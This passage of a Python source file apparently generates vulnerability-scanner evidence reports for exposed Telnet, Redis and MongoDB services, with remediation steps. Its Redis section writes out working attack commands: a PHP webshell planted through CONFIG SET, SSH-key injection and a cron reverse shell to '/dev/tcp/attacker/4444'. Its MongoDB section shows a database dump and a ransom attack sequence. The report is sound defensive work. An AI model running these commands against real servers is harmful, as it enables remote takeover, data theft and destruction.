  4. In the service config itself, bind to 127.0.0.1 (localhost only).

  This takes about 5 minutes and immediately eliminates the exposure.
"""
    return EvidenceRecord(raw, plain)


def port_telnet(hostname: str, port: int, banner: Optional[str],
                target_ip: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Telnet Service Detected (Port 23)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target IP", target_ip)}
{_kv("Port", "23/tcp")}
{_kv("Service", "Telnet")}
{_kv("Severity", "CRITICAL — Deprecated protocol, plaintext authentication")}

{_h2("CONNECTION RESULT")}
{_kv("TCP Handshake", "COMPLETED — Telnet service is responding")}
{_kv("Encryption", "NONE — all traffic in plaintext")}
{_kv("Protocol Age", "Designed 1969 — predates cryptography on networks")}
  Banner received:
{_code(banner[:300] if banner else "(no banner)")}

{_h2("TELNET PLAINTEXT CAPTURE EXAMPLE")}
{_code("""# An attacker on the path between you and the server sees exactly:
# (captured via tcpdump / Wireshark)
> login: admin
> Password: SuperSecretPass123!
> $ whoami
> root
# Every character is visible in the network capture.""")}

{_h2("CVE / REFERENCES")}
{_bullet([
    "No specific CVE needed — the design is inherently insecure by specification.",
    "NIST recommends disabling Telnet in all environments.",
    "PCI DSS requirement 2.2.7: all non-console administrative access must be encrypted.",
    "HIPAA: any plaintext transmission of PHI is a reportable violation.",
])}

{_h2("FIX")}
{_code(f"""# Disable Telnet:
systemctl stop telnet.socket
systemctl disable telnet.socket

# Remove Telnet server package:
apt remove telnetd    # Ubuntu/Debian
yum remove telnet-server  # CentOS/RHEL

# Install and use SSH instead:
apt install openssh-server
systemctl enable --now ssh

# Block port 23 at firewall as additional layer:
ufw deny 23/tcp""")}
"""

    plain = f"""
WHAT THIS MEANS — Telnet Must Be Disabled Immediately
──────────────────────────────────────────────────────
Telnet is a remote access protocol from 1969 that transmits EVERYTHING
in plain text — including passwords. There is no encryption at all.

WHAT AN ATTACKER SEES:
  When someone logs in over Telnet, every keystroke they type — including
  their username and password — travels across the network as readable text.
  Anyone who can see the network traffic (anyone on the same network segment,
  or anyone who has compromised a router along the path) reads the password
  directly, without any cryptographic effort whatsoever.

  It's the equivalent of shouting your password across a crowded room.

WHY IT STILL EXISTS:
  Telnet is sometimes left running on older servers, network equipment, or
  IoT devices that haven't been updated. Sometimes it's enabled during
  troubleshooting and never disabled.

HOW TO FIX IT:
  1. Disable and remove the Telnet service entirely.
  2. Use SSH (Secure Shell) instead — it does exactly what Telnet does but
     with strong encryption. SSH is installed by default on most servers.
  3. Block port 23 at the firewall as an additional safeguard.

This change takes 5 minutes and there is no valid reason to keep Telnet
running on any internet-connected server in 2024.
"""
    return EvidenceRecord(raw, plain)


def port_redis_exposed(hostname: str, port: int, banner: Optional[str],
                        target_ip: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Redis Exposed to Internet (Port 6379)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target IP", target_ip)}
{_kv("Port", "6379/tcp")}
{_kv("Service", "Redis")}
{_kv("CVSS Score", "10.0 — Critical")}

{_h2("CONNECTION RESULT")}
{_kv("TCP Connection", "OPEN — Redis is reachable from the internet")}
{_kv("Authentication Required", "UNKNOWN — depends on requirepass in redis.conf")}
  PING/PONG banner response:
{_code(banner or "(no banner received)")}

{_h2("UNAUTHENTICATED ACCESS TEST")}
{_code(f"""# Connect and test — no password required in default install:
redis-cli -h {hostname} -p {port}
{hostname}:{port}> PING
PONG   ← if this responds, no auth is required

{hostname}:{port}> KEYS *    # list all keys
{hostname}:{port}> GET <key> # read any value""")}

{_h2("REMOTE CODE EXECUTION VIA REDIS CONFIG")}
{_code(f"""# Method 1: Write a PHP webshell via Redis CONFIG SET:
redis-cli -h {hostname} -p {port} CONFIG SET dir /var/www/html
redis-cli -h {hostname} -p {port} CONFIG SET dbfilename shell.php
redis-cli -h {hostname} -p {port} SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h {hostname} -p {port} BGSAVE
# → http://{hostname}/shell.php?cmd=id  → runs as web user

# Method 2: Plant SSH key in root's authorized_keys:
redis-cli -h {hostname} -p {port} CONFIG SET dir /root/.ssh
redis-cli -h {hostname} -p {port} CONFIG SET dbfilename authorized_keys
redis-cli -h {hostname} -p {port} SET key "\\nssh-rsa AAAA...attacker_key...\\n"
redis-cli -h {hostname} -p {port} BGSAVE
# → ssh root@{hostname}  (now works for attacker)

# Method 3: Cron-based reverse shell:
redis-cli -h {hostname} -p {port} CONFIG SET dir /var/spool/cron/
redis-cli -h {hostname} -p {port} CONFIG SET dbfilename root
redis-cli -h {hostname} -p {port} SET x "\\n\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n"
redis-cli -h {hostname} -p {port} BGSAVE""")}

{_h2("FIX (ALL THREE LAYERS REQUIRED)")}
{_code(f"""# 1. Bind Redis to localhost only (/etc/redis/redis.conf):
bind 127.0.0.1

# 2. Require password authentication:
requirepass YourVeryStrongPasswordHere

# 3. Block at firewall:
ufw deny 6379/tcp
# Allow only from specific app server IPs:
ufw allow from APP_SERVER_IP to any port 6379

# 4. Disable CONFIG commands from remote clients:
rename-command CONFIG ""

# Restart Redis after changes:
systemctl restart redis""")}
"""

    plain = f"""
WHAT THIS MEANS — Redis Is Fully Accessible to Anyone
──────────────────────────────────────────────────────
Redis is an in-memory database that stores your application's sessions,
cached data, queues, and potentially much more. Port 6379 is open and
reachable from the internet.

THE DEFAULT INSTALL HAS NO PASSWORD.

If this Redis instance is running its default configuration, any person on
the internet can connect right now and:

  ▸ Read all stored data (sessions, cache, user data, API responses)
  ▸ Delete all data (FLUSHALL — instant data loss)
  ▸ Use Redis's built-in CONFIG command to write files to your server
    — and from there gain full server access (Remote Code Execution)

THE REMOTE CODE EXECUTION PATH:
  Redis can be configured to write its database to disk. An attacker can
  point this to your web server's public directory and write a PHP file
  containing a backdoor. Within minutes of finding the open port, a
  sophisticated attacker has a shell on your server running as root or the
  web server user.

  This is not theoretical — it is a well-documented, widely-exploited attack
  pattern against misconfigured Redis instances.

HOW TO FIX IT (all three steps):
  1. In /etc/redis/redis.conf: change "bind 0.0.0.0" to "bind 127.0.0.1"
     (Redis only listens on localhost — can't be reached from outside)
  2. Add: requirepass StrongPasswordHere  (password protection)
  3. Block port 6379 at your firewall as an additional layer

  Apply all three. Each one alone is insufficient.
"""
    return EvidenceRecord(raw, plain)


def port_mongodb_exposed(hostname: str, port: int, target_ip: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — MongoDB Exposed to Internet (Port 27017)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target IP", target_ip)}
{_kv("Port", "27017/tcp")}
{_kv("CVSS Score", "10.0 — Critical")}

{_h2("CONNECTION RESULT")}
{_kv("TCP Connection", "OPEN — MongoDB port reachable from internet")}
{_kv("Default Authentication", "DISABLED in many installs — no password required")}

{_h2("UNAUTHENTICATED ACCESS TEST")}
{_code(f"""# Connect with any MongoDB client:
mongo --host {hostname} --port {port}
# If no auth required:
> show dbs
> use admin
> db.getCollectionNames()
> db.users.find()  # read all user records""")}

{_h2("MASS DATA THEFT SCENARIO")}
{_code(f"""# Dump entire database with mongoexport:
mongoexport --host {hostname} --db your_app --collection users \\
  --out stolen_users.json
# → Contains all user records, emails, hashed passwords, personal data

# Ransom attack — documented attack pattern 2017-2024:
# 1. Attacker dumps all collections
# 2. Attacker drops all collections (db.users.drop())
# 3. Attacker inserts ransom note: db.PLEASE_READ.insert({{message:"Pay 0.5 BTC to..."}})
# 4. Victim finds empty databases and ransom note""")}

{_h2("HISTORICAL CONTEXT")}
{_bullet([
    "January 2017: 27,000 MongoDB instances wiped and ransomed in 24 hours.",
    "2020: 23,000 MongoDB instances exposed on Shodan/Censys.",
    "These attacks are fully automated — bots scan and exploit within hours of exposure.",
])}

{_h2("FIX")}
{_code(f"""# 1. Edit /etc/mongod.conf:
net:
  bindIp: 127.0.0.1  # localhost only

# 2. Enable authentication:
security:
  authorization: enabled

# 3. Create admin user (run in mongo shell):
use admin
db.createUser({{user:"admin", pwd:"StrongPassword", roles:[{{role:"root",db:"admin"}}]}})

# 4. Block port at firewall:
ufw deny 27017/tcp

systemctl restart mongod""")}
"""

    plain = f"""
WHAT THIS MEANS — Your MongoDB Database Is Open to the World
─────────────────────────────────────────────────────────────
MongoDB is your application's database. Port 27017 is open on the internet.
Depending on your configuration, anyone may be able to connect, read every
record, and delete everything — with no password required.

A DOCUMENTED, REPEATED ATTACK PATTERN:
  In January 2017, automated bots destroyed 27,000 MongoDB databases in a
  single 24-hour period. The attack was simple:
  1. Scan the internet for port 27017
  2. Connect (no password in default install)
  3. Copy all data
  4. Delete all data
  5. Leave a ransom note demanding Bitcoin payment

  Your database is at risk of exactly this attack right now.

WHAT IS IN YOUR DATABASE:
  All of your application's data — user accounts, orders, messages, personal
  information, payment records, everything you store. An attacker gets it all.

HOW TO FIX IT:
  1. In /etc/mongod.conf: change bindIp to 127.0.0.1 (so MongoDB only
     listens on the local machine, not on the internet)
  2. Enable authentication so a password is required to connect
  3. Block port 27017 at your cloud/server firewall

  These three steps, applied together, close this exposure completely.
  Takes 15 minutes. Do it now.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# CONVENIENCE DISPATCHER — call this from scanner.py
# ═══════════════════════════════════════════════════════════════════════════════

class EvidenceFactory:
    """
    Single-call interface for generating EvidenceRecords in scanner.py.

    Usage in scanner.py:
        from evidence_engine import EvidenceFactory
        ev = EvidenceFactory()
        record = ev.ssl_no_https(url, hostname, port)
        # Use record.combined, record.raw, or record.plain
    """

    # SSL
    def ssl_no_https(self, url, hostname, port): return ssl_no_https(url, hostname, port)
    def ssl_expired_cert(self, *a, **kw): return ssl_expired_cert(*a, **kw)
    def ssl_expiring_soon(self, *a, **kw): return ssl_expiring_soon(*a, **kw)
    def ssl_weak_protocol(self, *a, **kw): return ssl_weak_protocol(*a, **kw)
    def ssl_weak_cipher(self, *a, **kw): return ssl_weak_cipher(*a, **kw)
    def ssl_untrusted_cert(self, *a, **kw): return ssl_untrusted_cert(*a, **kw)

    # Headers
    def security_header_missing(self, *a, **kw): return security_header_missing(*a, **kw)

    # CORS
    def cors_wildcard(self, *a, **kw): return cors_wildcard(*a, **kw)
    def cors_reflection_with_credentials(self, *a, **kw): return cors_reflection_with_credentials(*a, **kw)
    def cors_reflection_no_credentials(self, *a, **kw): return cors_reflection_no_credentials(*a, **kw)

    # SQLi
    def sqli_error_based(self, *a, **kw): return sqli_error_based(*a, **kw)
    def sqli_time_based(self, *a, **kw): return sqli_time_based(*a, **kw)

    # XSS
    def xss_reflected(self, *a, **kw): return xss_reflected(*a, **kw)
    def xss_dom_sinks(self, *a, **kw): return xss_dom_sinks(*a, **kw)

    # Open Redirect
    def open_redirect(self, *a, **kw): return open_redirect(*a, **kw)

    # Sensitive Files
    def sensitive_file_exposed(self, *a, **kw): return sensitive_file_exposed(*a, **kw)

    # Information Disclosure
    def info_server_version(self, *a, **kw): return info_server_version(*a, **kw)
    def info_exposed_secret(self, *a, **kw): return info_exposed_secret(*a, **kw)
    def info_mixed_content(self, *a, **kw): return info_mixed_content(*a, **kw)

    # Cookie Misconfigurations
    def cookie_missing_flag(self, *a, **kw): return cookie_missing_flag(*a, **kw)

    # Port Scan
    def port_exposed_service(self, *a, **kw): return port_exposed_service(*a, **kw)
    def port_telnet(self, *a, **kw): return port_telnet(*a, **kw)
    def port_redis_exposed(self, *a, **kw): return port_redis_exposed(*a, **kw)
    def port_mongodb_exposed(self, *a, **kw): return port_mongodb_exposed(*a, **kw)